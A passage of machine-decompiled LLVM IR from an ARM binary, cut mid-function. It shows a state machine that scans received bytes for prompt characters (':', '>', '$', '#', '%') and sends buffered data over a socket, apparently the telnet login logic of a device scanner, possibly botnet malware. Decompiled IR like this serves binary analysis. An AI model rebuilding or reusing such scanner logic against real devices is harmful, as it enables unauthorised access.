  %v2_10dd4 = inttoptr i32 %v1_10dd4 to i32*
  %v3_10dd4 = load i32, i32* %v2_10dd4, align 4
  store i32 %v3_10dd4, i32* @r0, align 4
  %v1_10dd8 = call i32 @function_15b6c(i32 %v3_10dd4)
  store i32 %v1_10dd8, i32* %r0.global-to-local, align 4
  %v0_10ddc = load i32, i32* @r6, align 4
  %v1_10ddc = add i32 %v0_10ddc, 284
  %v2_10ddc = inttoptr i32 %v1_10ddc to i8*
  %v3_10ddc = load i8, i8* %v2_10ddc, align 1
  %v4_10ddc = zext i8 %v3_10ddc to i32
  %v1_10de0 = add nuw nsw i32 %v4_10ddc, 1
  %v1_10de4 = urem i32 %v1_10de0, 256
  store i32 %v1_10de4, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_10dec = icmp ugt i32 %v1_10de4, 9
  store i1 %v2_10dec, i1* %cpsr_c.global-to-local, align 1
  %v7_10dec = icmp eq i32 %v1_10de4, 10
  store i1 %v7_10dec, i1* %cpsr_z.global-to-local, align 1
  %v2_10df0 = add i32 %v0_10ddc, 4
  %v3_10df0 = inttoptr i32 %v2_10df0 to i32*
  store i32 -1, i32* %v3_10df0, align 4
  %v0_10df4 = load i32, i32* %r3.global-to-local, align 4
  %v1_10df4 = trunc i32 %v0_10df4 to i8
  %v2_10df4 = load i32, i32* @r6, align 4
  %v3_10df4 = add i32 %v2_10df4, 284
  %v4_10df4 = inttoptr i32 %v3_10df4 to i8*
  store i8 %v1_10df4, i8* %v4_10df4, align 1
  %v0_10df8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10df8, label %dec_label_pc_10dfc, label %dec_label_pc_117a4

dec_label_pc_10dfc:                               ; preds = %dec_label_pc_10dcc
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_10e00 = load i32, i32* @r6, align 4
  %v2_10e00 = add i32 %v1_10e00, 12
  %v3_10e00 = inttoptr i32 %v2_10e00 to i32*
  store i32 0, i32* %v3_10e00, align 4
  %v0_10e04 = load i32, i32* %r3.global-to-local, align 4
  %v1_10e04 = trunc i32 %v0_10e04 to i8
  %v2_10e04 = load i32, i32* @r6, align 4
  %v3_10e04 = add i32 %v2_10e04, 284
  %v4_10e04 = inttoptr i32 %v3_10e04 to i8*
  store i8 %v1_10e04, i8* %v4_10e04, align 1
  br label %dec_label_pc_10e08

dec_label_pc_10e08:                               ; preds = %dec_label_pc_117a4, %dec_label_pc_10dfc
  store i32 -1, i32* @r7, align 4
  br label %dec_label_pc_10e0c

dec_label_pc_10e0c:                               ; preds = %dec_label_pc_11400, %dec_label_pc_11308, %dec_label_pc_11234, %dec_label_pc_11160, %dec_label_pc_10f84, %dec_label_pc_10eb0, %dec_label_pc_10e08
  %v0_10e0c = load i32, i32* @r6, align 4
  %v1_10e0c = add i32 %v0_10e0c, 24
  %v2_10e0c = inttoptr i32 %v1_10e0c to i32*
  %v3_10e0c = load i32, i32* %v2_10e0c, align 4
  %v0_10e10 = load i32, i32* @r7, align 4
  %v2_10e10 = sub i32 %v0_10e10, %v3_10e0c
  %v3_10e10 = icmp uge i32 %v0_10e10, %v3_10e0c
  store i1 %v3_10e10, i1* %cpsr_c.global-to-local, align 1
  %v4_10e10 = xor i32 %v0_10e10, %v3_10e0c
  %v5_10e10 = xor i32 %v2_10e10, %v0_10e10
  %v6_10e10 = and i32 %v5_10e10, %v4_10e10
  %v7_10e10 = icmp slt i32 %v6_10e10, 0
  %v8_10e10 = icmp slt i32 %v2_10e10, 0
  %v9_10e10 = icmp eq i32 %v0_10e10, %v3_10e0c
  store i1 %v9_10e10, i1* %cpsr_z.global-to-local, align 1
  %v2_10e14 = xor i1 %v8_10e10, %v7_10e10
  %v0_10e10.v3_10e0c = select i1 %v2_10e14, i32 %v0_10e10, i32 %v3_10e0c
  store i32 %v0_10e10.v3_10e0c, i32* %r1.global-to-local, align 4
  %v2_10e1c = sub i32 %v3_10e0c, %v0_10e10.v3_10e0c
  store i32 %v2_10e1c, i32* %r2.global-to-local, align 4
  store i32 %v2_10e1c, i32* %v2_10e0c, align 4
  %v0_10e24 = load i32, i32* @fp, align 4
  %v1_10e24 = load i32, i32* %r1.global-to-local, align 4
  %v2_10e24 = add i32 %v1_10e24, %v0_10e24
  store i32 %v2_10e24, i32* %r1.global-to-local, align 4
  store i32 %v0_10e24, i32* %r0.global-to-local, align 4
  %v3_10e2c = inttoptr i32 %v0_10e24 to i8*
  %v4_10e2c = call i32 @function_15448(i8* %v3_10e2c, i32 %v2_10e24, i32 %v2_10e1c)
  store i32 %v4_10e2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10cdc

dec_label_pc_10e34:                               ; preds = %dec_label_pc_10cdc
  %v1_10e34 = add i32 %v0_10cdc, 24
  %v2_10e34 = inttoptr i32 %v1_10e34 to i32*
  %v3_10e34 = load i32, i32* %v2_10e34, align 4
  store i32 %v3_10e34, i32* %r2.global-to-local, align 4
  %v1_10e38 = add i32 %v3_10e34, -1
  store i32 %v1_10e38, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10e3c = icmp eq i32 %v1_10e38, 0
  store i1 %v2_10e3c, i1* %cpsr_z.global-to-local, align 1
  %tmp349 = icmp slt i32 %v1_10e38, 1
  br i1 %tmp349, label %dec_label_pc_10c5cthread-pre-split.thread, label %dec_label_pc_10e44

dec_label_pc_10e44:                               ; preds = %dec_label_pc_10e34
  %v2_10e44 = add i32 %v1_10e38, %v0_10cdc
  store i32 %v2_10e44, i32* %r3.global-to-local, align 4
  %v1_10e48 = add i32 %v2_10e44, 28
  %v2_10e48 = inttoptr i32 %v1_10e48 to i8*
  %v3_10e48 = load i8, i8* %v2_10e48, align 1
  %v4_10e48 = zext i8 %v3_10e48 to i32
  store i32 %v4_10e48, i32* %r3.global-to-local, align 4
  %v2_10e4c = icmp ugt i8 %v3_10e48, 61
  store i1 %v2_10e4c, i1* %cpsr_c.global-to-local, align 1
  %v7_10e4c = icmp eq i8 %v3_10e48, 62
  store i1 %v7_10e4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e4c, label %dec_label_pc_10eb0, label %bb350

bb350:                                            ; preds = %dec_label_pc_10e44
  %v3_10e50 = icmp ugt i8 %v3_10e48, 57
  store i1 %v3_10e50, i1* %cpsr_c.global-to-local, align 1
  %v8_10e50 = icmp eq i8 %v3_10e48, 58
  store i1 %v8_10e50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10e50, label %dec_label_pc_10eb0, label %dec_label_pc_10e58

dec_label_pc_10e58:                               ; preds = %bb350
  %v2_10e58 = icmp ugt i8 %v3_10e48, 35
  store i1 %v2_10e58, i1* %cpsr_c.global-to-local, align 1
  %v7_10e58 = icmp eq i8 %v3_10e48, 36
  store i1 %v7_10e58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e58, label %dec_label_pc_10eb0, label %dec_label_pc_10e60

dec_label_pc_10e60:                               ; preds = %dec_label_pc_10e58
  %v2_10e60 = icmp ugt i8 %v3_10e48, 34
  store i1 %v2_10e60, i1* %cpsr_c.global-to-local, align 1
  %v7_10e60 = icmp eq i8 %v3_10e48, 35
  store i1 %v7_10e60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e60, label %dec_label_pc_10eb0, label %dec_label_pc_10e68

dec_label_pc_10e68:                               ; preds = %dec_label_pc_10e60
  %v2_10e68 = icmp ugt i8 %v3_10e48, 36
  store i1 %v2_10e68, i1* %cpsr_c.global-to-local, align 1
  %v7_10e68 = icmp eq i8 %v3_10e48, 37
  store i1 %v7_10e68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e68, label %dec_label_pc_10eb0, label %dec_label_pc_10e98.preheader

dec_label_pc_10e98.preheader:                     ; preds = %dec_label_pc_10e68
  %v3_10e6c = add i32 %v0_10cdc, 28
  %v2_10e70 = add i32 %v3_10e6c, %v3_10e34
  store i32 %v2_10e70, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10e98

dec_label_pc_10e7c:                               ; preds = %bb351
  %v2_10e7c = icmp ugt i8 %v3_10ea0, 35
  store i1 %v2_10e7c, i1* %cpsr_c.global-to-local, align 1
  %v7_10e7c = icmp eq i8 %v3_10ea0, 36
  store i1 %v7_10e7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e7c, label %dec_label_pc_10eb0, label %dec_label_pc_10e84

dec_label_pc_10e84:                               ; preds = %dec_label_pc_10e7c
  %v2_10e84 = icmp ugt i8 %v3_10ea0, 34
  store i1 %v2_10e84, i1* %cpsr_c.global-to-local, align 1
  %v7_10e84 = icmp eq i8 %v3_10ea0, 35
  store i1 %v7_10e84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e84, label %dec_label_pc_10eb0, label %dec_label_pc_10e8c

dec_label_pc_10e8c:                               ; preds = %dec_label_pc_10e84
  %v2_10e8c = icmp ugt i8 %v3_10ea0, 36
  store i1 %v2_10e8c, i1* %cpsr_c.global-to-local, align 1
  %v7_10e8c = icmp eq i8 %v3_10ea0, 37
  store i1 %v7_10e8c, i1* %cpsr_z.global-to-local, align 1
  %v1_10e90 = add i32 %v0_10e90, -1
  store i32 %v1_10e90, i32* %r3.global-to-local, align 4
  br i1 %v7_10e8c, label %dec_label_pc_10eb0, label %dec_label_pc_10e98

dec_label_pc_10e98:                               ; preds = %dec_label_pc_10e98.preheader, %dec_label_pc_10e8c
  %v0_10e90 = phi i32 [ %v2_10e70, %dec_label_pc_10e98.preheader ], [ %v1_10e90, %dec_label_pc_10e8c ]
  %v0_10e98 = phi i32 [ %v1_10e38, %dec_label_pc_10e98.preheader ], [ %v1_10e98, %dec_label_pc_10e8c ]
  %v1_10e98 = add i32 %v0_10e98, -1
  store i32 %v1_10e98, i32* %r1.global-to-local, align 4
  %v2_10e98 = icmp ne i32 %v0_10e98, 0
  store i1 %v2_10e98, i1* %cpsr_c.global-to-local, align 1
  %v7_10e98 = icmp eq i32 %v0_10e98, 1
  store i1 %v7_10e98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e98, label %dec_label_pc_10c5cthread-pre-split.thread477, label %dec_label_pc_10ea0

dec_label_pc_10ea0:                               ; preds = %dec_label_pc_10e98
  %v1_10ea0 = add i32 %v0_10e90, -2
  %v2_10ea0 = inttoptr i32 %v1_10ea0 to i8*
  %v3_10ea0 = load i8, i8* %v2_10ea0, align 1
  %v4_10ea0 = zext i8 %v3_10ea0 to i32
  store i32 %v4_10ea0, i32* %r2.global-to-local, align 4
  %v2_10ea4 = icmp ugt i8 %v3_10ea0, 61
  store i1 %v2_10ea4, i1* %cpsr_c.global-to-local, align 1
  %v7_10ea4 = icmp eq i8 %v3_10ea0, 62
  store i1 %v7_10ea4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10ea4, label %dec_label_pc_10eb0, label %bb351

bb351:                                            ; preds = %dec_label_pc_10ea0
  %v3_10ea8 = icmp ugt i8 %v3_10ea0, 57
  store i1 %v3_10ea8, i1* %cpsr_c.global-to-local, align 1
  %v8_10ea8 = icmp eq i8 %v3_10ea0, 58
  store i1 %v8_10ea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10ea8, label %dec_label_pc_10eb0, label %dec_label_pc_10e7c

dec_label_pc_10eb0:                               ; preds = %dec_label_pc_10ea0, %bb351, %dec_label_pc_10e8c, %dec_label_pc_10e84, %dec_label_pc_10e7c, %dec_label_pc_10e68, %dec_label_pc_10e44, %dec_label_pc_10e60, %dec_label_pc_10e58, %bb350
  %v0_10eb4 = phi i32 [ %v1_10e38, %dec_label_pc_10e68 ], [ %v1_10e38, %dec_label_pc_10e44 ], [ %v1_10e38, %dec_label_pc_10e60 ], [ %v1_10e38, %dec_label_pc_10e58 ], [ %v1_10e38, %bb350 ], [ %v1_10e98, %dec_label_pc_10e7c ], [ %v1_10e98, %dec_label_pc_10e84 ], [ %v1_10e98, %dec_label_pc_10e8c ], [ %v1_10e98, %bb351 ], [ %v1_10e98, %dec_label_pc_10ea0 ]
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_10eb4 = add i32 %v0_10eb4, 1
  store i32 %v1_10eb4, i32* @r7, align 4
  %v1_10eb8 = call i32 @function_11ad8(i32 24)
  store i32 %v2_11318, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r0.global-to-local, align 4
  %v3_10ec8 = call i32 @function_11a14(i32 24, i32* nonnull %stack_var_-60)
  store i32 %v3_10ec8, i32* %r0.global-to-local, align 4
  %v3_10ecc = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10ecc, i32* @r2, align 4
  store i32 %v3_10ec8, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10ed8 = load i32, i32* @r6, align 4
  %v1_10ed8 = add i32 %v0_10ed8, 4
  %v2_10ed8 = inttoptr i32 %v1_10ed8 to i32*
  %v3_10ed8 = load i32, i32* %v2_10ed8, align 4
  store i32 %v3_10ed8, i32* @r0, align 4
  %v4_10edc = call i32 @function_14ac0(i32 %v3_10ed8, i32 %v3_10ec8, i32 %v3_10ecc, i32 16384)
  store i32 %v4_10edc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10eec = load i32, i32* @r6, align 4
  %v1_10eec = add i32 %v0_10eec, 4
  %v2_10eec = inttoptr i32 %v1_10eec to i32*
  %v3_10eec = load i32, i32* %v2_10eec, align 4
  store i32 %v3_10eec, i32* @r0, align 4
  %v4_10ef0 = call i32 @function_14ac0(i32 %v3_10eec, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32 2, i32 16384)
  store i32 24, i32* %r0.global-to-local, align 4
  %v1_10ef8 = call i32 @function_11a38(i32 24)
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_10f00 = load i32, i32* @r6, align 4
  %v2_10f00 = add i32 %v1_10f00, 12
  %v3_10f00 = inttoptr i32 %v2_10f00 to i32*
  store i32 10, i32* %v3_10f00, align 4
  br label %dec_label_pc_10e0c

dec_label_pc_10f08:                               ; preds = %dec_label_pc_10cdc
  %v1_10f08 = add i32 %v0_10cdc, 24
  %v2_10f08 = inttoptr i32 %v1_10f08 to i32*
  %v3_10f08 = load i32, i32* %v2_10f08, align 4
  store i32 %v3_10f08, i32* %r2.global-to-local, align 4
  %v1_10f0c = add i32 %v3_10f08, -1
  store i32 %v1_10f0c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10f10 = icmp eq i32 %v1_10f0c, 0
  store i1 %v2_10f10, i1* %cpsr_z.global-to-local, align 1
  %tmp352 = icmp slt i32 %v1_10f0c, 1
  br i1 %tmp352, label %dec_label_pc_10c5cthread-pre-split.thread, label %dec_label_pc_10f18

dec_label_pc_10f18:                               ; preds = %dec_label_pc_10f08
  %v2_10f18 = add i32 %v1_10f0c, %v0_10cdc
  store i32 %v2_10f18, i32* %r3.global-to-local, align 4
  %v1_10f1c = add i32 %v2_10f18, 28
  %v2_10f1c = inttoptr i32 %v1_10f1c to i8*
  %v3_10f1c = load i8, i8* %v2_10f1c, align 1
  %v4_10f1c = zext i8 %v3_10f1c to i32
  store i32 %v4_10f1c, i32* %r3.global-to-local, align 4
  %v2_10f20 = icmp ugt i8 %v3_10f1c, 61
  store i1 %v2_10f20, i1* %cpsr_c.global-to-local, align 1
  %v7_10f20 = icmp eq i8 %v3_10f1c, 62
  store i1 %v7_10f20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f20, label %dec_label_pc_10f84, label %bb353

bb353:                                            ; preds = %dec_label_pc_10f18
  %v3_10f24 = icmp ugt i8 %v3_10f1c, 57
  store i1 %v3_10f24, i1* %cpsr_c.global-to-local, align 1
  %v8_10f24 = icmp eq i8 %v3_10f1c, 58
  store i1 %v8_10f24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10f24, label %dec_label_pc_10f84, label %dec_label_pc_10f2c

dec_label_pc_10f2c:                               ; preds = %bb353
  %v2_10f2c = icmp ugt i8 %v3_10f1c, 35
  store i1 %v2_10f2c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f2c = icmp eq i8 %v3_10f1c, 36
  store i1 %v7_10f2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f2c, label %dec_label_pc_10f84, label %dec_label_pc_10f34

dec_label_pc_10f34:                               ; preds = %dec_label_pc_10f2c
  %v2_10f34 = icmp ugt i8 %v3_10f1c, 34
  store i1 %v2_10f34, i1* %cpsr_c.global-to-local, align 1
  %v7_10f34 = icmp eq i8 %v3_10f1c, 35
  store i1 %v7_10f34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f34, label %dec_label_pc_10f84, label %dec_label_pc_10f3c

dec_label_pc_10f3c:                               ; preds = %dec_label_pc_10f34
  %v2_10f3c = icmp ugt i8 %v3_10f1c, 36
  store i1 %v2_10f3c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f3c = icmp eq i8 %v3_10f1c, 37
  store i1 %v7_10f3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f3c, label %dec_label_pc_10f84, label %dec_label_pc_10f6c.preheader

dec_label_pc_10f6c.preheader:                     ; preds = %dec_label_pc_10f3c
  %v3_10f40 = add i32 %v0_10cdc, 28
  %v2_10f44 = add i32 %v3_10f40, %v3_10f08
  store i32 %v2_10f44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10f6c

dec_label_pc_10f50:                               ; preds = %bb354
  %v2_10f50 = icmp ugt i8 %v3_10f74, 35
  store i1 %v2_10f50, i1* %cpsr_c.global-to-local, align 1
  %v7_10f50 = icmp eq i8 %v3_10f74, 36
  store i1 %v7_10f50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f50, label %dec_label_pc_10f84, label %dec_label_pc_10f58

dec_label_pc_10f58:                               ; preds = %dec_label_pc_10f50
  %v2_10f58 = icmp ugt i8 %v3_10f74, 34
  store i1 %v2_10f58, i1* %cpsr_c.global-to-local, align 1
  %v7_10f58 = icmp eq i8 %v3_10f74, 35
  store i1 %v7_10f58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f58, label %dec_label_pc_10f84, label %dec_label_pc_10f60

dec_label_pc_10f60:                               ; preds = %dec_label_pc_10f58
  %v2_10f60 = icmp ugt i8 %v3_10f74, 36
  store i1 %v2_10f60, i1* %cpsr_c.global-to-local, align 1
  %v7_10f60 = icmp eq i8 %v3_10f74, 37
  store i1 %v7_10f60, i1* %cpsr_z.global-to-local, align 1
  %v1_10f64 = add i32 %v0_10f64, -1
  store i32 %v1_10f64, i32* %r3.global-to-local, align 4
  br i1 %v7_10f60, label %dec_label_pc_10f84, label %dec_label_pc_10f6c

dec_label_pc_10f6c:                               ; preds = %dec_label_pc_10f6c.preheader, %dec_label_pc_10f60
  %v0_10f64 = phi i32 [ %v2_10f44, %dec_label_pc_10f6c.preheader ], [ %v1_10f64, %dec_label_pc_10f60 ]
  %v0_10f6c = phi i32 [ %v1_10f0c, %dec_label_pc_10f6c.preheader ], [ %v1_10f6c, %dec_label_pc_10f60 ]
  %v1_10f6c = add i32 %v0_10f6c, -1
  store i32 %v1_10f6c, i32* %r1.global-to-local, align 4
  %v2_10f6c = icmp ne i32 %v0_10f6c, 0
  store i1 %v2_10f6c, i1* %cpsr_c.global-to-local, align 1
  %v7_10f6c = icmp eq i32 %v0_10f6c, 1
  store i1 %v7_10f6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f6c, label %dec_label_pc_10c5cthread-pre-split.thread477, label %dec_label_pc_10f74

dec_label_pc_10f74:                               ; preds = %dec_label_pc_10f6c
  %v1_10f74 = add i32 %v0_10f64, -2
  %v2_10f74 = inttoptr i32 %v1_10f74 to i8*
  %v3_10f74 = load i8, i8* %v2_10f74, align 1
  %v4_10f74 = zext i8 %v3_10f74 to i32
  store i32 %v4_10f74, i32* %r2.global-to-local, align 4
  %v2_10f78 = icmp ugt i8 %v3_10f74, 61
  store i1 %v2_10f78, i1* %cpsr_c.global-to-local, align 1
  %v7_10f78 = icmp eq i8 %v3_10f74, 62
  store i1 %v7_10f78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10f78, label %dec_label_pc_10f84, label %bb354

bb354:                                            ; preds = %dec_label_pc_10f74
  %v3_10f7c = icmp ugt i8 %v3_10f74, 57
  store i1 %v3_10f7c, i1* %cpsr_c.global-to-local, align 1
  %v8_10f7c = icmp eq i8 %v3_10f74, 58
  store i1 %v8_10f7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10f7c, label %dec_label_pc_10f84, label %dec_label_pc_10f50

dec_label_pc_10f84:                               ; preds = %dec_label_pc_10f74, %bb354, %dec_label_pc_10f60, %dec_label_pc_10f58, %dec_label_pc_10f50, %dec_label_pc_10f3c, %dec_label_pc_10f18, %dec_label_pc_10f34, %dec_label_pc_10f2c, %bb353
  %v0_10f88 = phi i32 [ %v1_10f0c, %dec_label_pc_10f3c ], [ %v1_10f0c, %dec_label_pc_10f18 ], [ %v1_10f0c, %dec_label_pc_10f34 ], [ %v1_10f0c, %dec_label_pc_10f2c ], [ %v1_10f0c, %bb353 ], [ %v1_10f6c, %dec_label_pc_10f50 ], [ %v1_10f6c, %dec_label_pc_10f58 ], [ %v1_10f6c, %dec_label_pc_10f60 ], [ %v1_10f6c, %bb354 ], [ %v1_10f6c, %dec_label_pc_10f74 ]
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_10f88 = add i32 %v0_10f88, 1
  store i32 %v1_10f88, i32* @r7, align 4
  %v1_10f8c = call i32 @function_11ad8(i32 20)
  store i32 %v2_11318, i32* %r1.global-to-local, align 4
  store i32 20, i32* %r0.global-to-local, align 4
  %v3_10f9c = call i32 @function_11a14(i32 20, i32* nonnull %stack_var_-60)
  store i32 %v3_10f9c, i32* %r0.global-to-local, align 4
  %v3_10fa0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10fa0, i32* @r2, align 4
  store i32 %v3_10f9c, i32* @r1, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10fac = load i32, i32* @r6, align 4
  %v1_10fac = add i32 %v0_10fac, 4
  %v2_10fac = inttoptr i32 %v1_10fac to i32*
  %v3_10fac = load i32, i32* %v2_10fac, align 4
  store i32 %v3_10fac, i32* @r0, align 4
  %v4_10fb0 = call i32 @function_14ac0(i32 %v3_10fac, i32 %v3_10f9c, i32 %v3_10fa0, i32 16384)
  store i32 %v4_10fb0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10fc0 = load i32, i32* @r6, align 4
  %v1_10fc0 = add i32 %v0_10fc0, 4
  %v2_10fc0 = inttoptr i32 %v1_10fc0 to i32*
  %v3_10fc0 = load i32, i32* %v2_10fc0, align 4
  store i32 %v3_10fc0, i32* @r0, align 4
  %v4_10fc4 = call i32 @function_14ac0(i32 %v3_10fc0, i32 ptrtoint ([3 x i8]* @global_var_197c0.32 to i32), i32 2, i32 16384)
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_10fcc = call i32 @function_11a38(i32 20)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_10fd4 = load i32, i32* @r6, align 4
  %v2_10fd4 = add i32 %v1_10fd4, 12
  %v3_10fd4 = inttoptr i32 %v2_10fd4 to i32*
  store i32 8, i32* %v3_10fd4, align 4
  br label %dec_label_pc_10e0c

dec_label_pc_110e4:                               ; preds = %dec_label_pc_10cdc
  %v1_110e4 = add i32 %v0_10cdc, 24
  %v2_110e4 = inttoptr i32 %v1_110e4 to i32*
  %v3_110e4 = load i32, i32* %v2_110e4, align 4
  store i32 %v3_110e4, i32* %r2.global-to-local, align 4
  %v1_110e8 = add i32 %v3_110e4, -1
  store i32 %v1_110e8, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_110ec = icmp eq i32 %v1_110e8, 0
  store i1 %v2_110ec, i1* %cpsr_z.global-to-local, align 1
  %tmp355 = icmp slt i32 %v1_110e8, 1
  br i1 %tmp355, label %dec_label_pc_10c5cthread-pre-split.thread, label %dec_label_pc_110f4

dec_label_pc_110f4:                               ; preds = %dec_label_pc_110e4
  %v2_110f4 = add i32 %v1_110e8, %v0_10cdc
  store i32 %v2_110f4, i32* %r3.global-to-local, align 4
  %v1_110f8 = add i32 %v2_110f4, 28
  %v2_110f8 = inttoptr i32 %v1_110f8 to i8*
  %v3_110f8 = load i8, i8* %v2_110f8, align 1
  %v4_110f8 = zext i8 %v3_110f8 to i32
  store i32 %v4_110f8, i32* %r3.global-to-local, align 4
  %v2_110fc = icmp ugt i8 %v3_110f8, 61
  store i1 %v2_110fc, i1* %cpsr_c.global-to-local, align 1
  %v7_110fc = icmp eq i8 %v3_110f8, 62
  store i1 %v7_110fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_110fc, label %dec_label_pc_11160, label %bb356

bb356:                                            ; preds = %dec_label_pc_110f4
  %v3_11100 = icmp ugt i8 %v3_110f8, 57
  store i1 %v3_11100, i1* %cpsr_c.global-to-local, align 1
  %v8_11100 = icmp eq i8 %v3_110f8, 58
  store i1 %v8_11100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_11100, label %dec_label_pc_11160, label %dec_label_pc_11108

dec_label_pc_11108:                               ; preds = %bb356
  %v2_11108 = icmp ugt i8 %v3_110f8, 35
  store i1 %v2_11108, i1* %cpsr_c.global-to-local, align 1
  %v7_11108 = icmp eq i8 %v3_110f8, 36
  store i1 %v7_11108, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11108, label %dec_label_pc_11160, label %dec_label_pc_11110

dec_label_pc_11110:                               ; preds = %dec_label_pc_11108
  %v2_11110 = icmp ugt i8 %v3_110f8, 34
  store i1 %v2_11110, i1* %cpsr_c.global-to-local, align 1
  %v7_11110 = icmp eq i8 %v3_110f8, 35
  store i1 %v7_11110, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11110, label %dec_label_pc_11160, label %dec_label_pc_11118

dec_label_pc_11118:                               ; preds = %dec_label_pc_11110
  %v2_11118 = icmp ugt i8 %v3_110f8, 36
  store i1 %v2_11118, i1* %cpsr_c.global-to-local, align 1
  %v7_11118 = icmp eq i8 %v3_110f8, 37
  store i1 %v7_11118, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11118, label %dec_label_pc_11160, label %dec_label_pc_11148.preheader

dec_label_pc_11148.preheader:                     ; preds = %dec_label_pc_11118
  %v3_1111c = add i32 %v0_10cdc, 28
  %v2_11120 = add i32 %v3_1111c, %v3_110e4
  store i32 %v2_11120, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_11148

dec_label_pc_1112c:                               ; preds = %bb357
  %v2_1112c = icmp ugt i8 %v3_11150, 35
  store i1 %v2_1112c, i1* %cpsr_c.global-to-local, align 1
  %v7_1112c = icmp eq i8 %v3_11150, 36
  store i1 %v7_1112c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1112c, label %dec_label_pc_11160, label %dec_label_pc_11134

dec_label_pc_11134:                               ; preds = %dec_label_pc_1112c
  %v2_11134 = icmp ugt i8 %v3_11150, 34
  store i1 %v2_11134, i1* %cpsr_c.global-to-local, align 1
  %v7_11134 = icmp eq i8 %v3_11150, 35
  store i1 %v7_11134, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11134, label %dec_label_pc_11160, label %dec_label_pc_1113c

dec_label_pc_1113c:                               ; preds = %dec_label_pc_11134
  %v2_1113c = icmp ugt i8 %v3_11150, 36
  store i1 %v2_1113c, i1* %cpsr_c.global-to-local, align 1
  %v7_1113c = icmp eq i8 %v3_11150, 37
  store i1 %v7_1113c, i1* %cpsr_z.global-to-local, align 1
  %v1_11140 = add i32 %v0_11140, -1
  store i32 %v1_11140, i32* %r3.global-to-local, align 4
  br i1 %v7_1113c, label %dec_label_pc_11160, label %dec_label_pc_11148

dec_label_pc_11148:                               ; preds = %dec_label_pc_11148.preheader, %dec_label_pc_1113c
  %v0_11140 = phi i32 [ %v2_11120, %dec_label_pc_11148.preheader ], [ %v1_11140, %dec_label_pc_1113c ]
  %v0_11148 = phi i32 [ %v1_110e8, %dec_label_pc_11148.preheader ], [ %v1_11148, %dec_label_pc_1113c ]
  %v1_11148 = add i32 %v0_11148, -1
  store i32 %v1_11148, i32* %r1.global-to-local, align 4
  %v2_11148 = icmp ne i32 %v0_11148, 0
  store i1 %v2_11148, i1* %cpsr_c.global-to-local, align 1
  %v7_11148 = icmp eq i32 %v0_11148, 1
  store i1 %v7_11148, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11148, label %dec_label_pc_10c5cthread-pre-split.thread477, label %dec_label_pc_11150

dec_label_pc_11150:                               ; preds = %dec_label_pc_11148
  %v1_11150 = add i32 %v0_11140, -2
  %v2_11150 = inttoptr i32 %v1_11150 to i8*
  %v3_11150 = load i8, i8* %v2_11150, align 1
  %v4_11150 = zext i8 %v3_11150 to i32
  store i32 %v4_11150, i32* %r2.global-to-local, align 4
  %v2_11154 = icmp ugt i8 %v3_11150, 61
  store i1 %v2_11154, i1* %cpsr_c.global-to-local, align 1
  %v7_11154 = icmp eq i8 %v3_11150, 62
  store i1 %v7_11154, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_11154, label %dec_label_pc_11160, label %bb357

bb357:                                            ; preds = %dec_label_pc_11150
  %v3_11158 = icmp ugt i8 %v3_11150, 57
